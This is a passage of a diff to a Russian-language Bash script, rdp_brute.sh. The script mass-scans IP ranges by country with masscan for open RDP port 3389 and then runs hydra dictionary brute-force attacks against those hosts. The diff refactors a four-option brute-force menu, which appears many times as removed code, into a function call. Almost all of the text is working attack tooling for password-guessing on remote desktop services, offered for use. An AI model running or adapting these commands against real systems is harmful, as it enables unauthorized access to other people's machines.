-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 else
 if [ "$country" = "24" ]; then
@@ -2089,6 +1036,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -2098,53 +1046,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -2162,6 +1064,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -2171,53 +1074,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 else
 if [ "$country" = "26" ]; then
@@ -2234,6 +1091,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -2243,53 +1101,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -2307,6 +1119,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -2316,53 +1129,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -2380,6 +1147,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -2389,53 +1157,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -2453,6 +1175,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -2462,53 +1185,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -2526,6 +1203,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -2535,53 +1213,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -2599,6 +1231,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -2608,53 +1241,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -2672,6 +1259,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -2681,53 +1269,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 else
 if [ "$country" = "33" ]; then
@@ -2744,6 +1286,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -2753,53 +1296,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -2817,6 +1314,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -2826,53 +1324,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 else
 if [ "$country" = "35" ]; then
@@ -2889,6 +1341,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -2898,53 +1351,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 else
 if [ "$country" = "36" ]; then
@@ -2961,6 +1368,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -2970,53 +1378,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 else
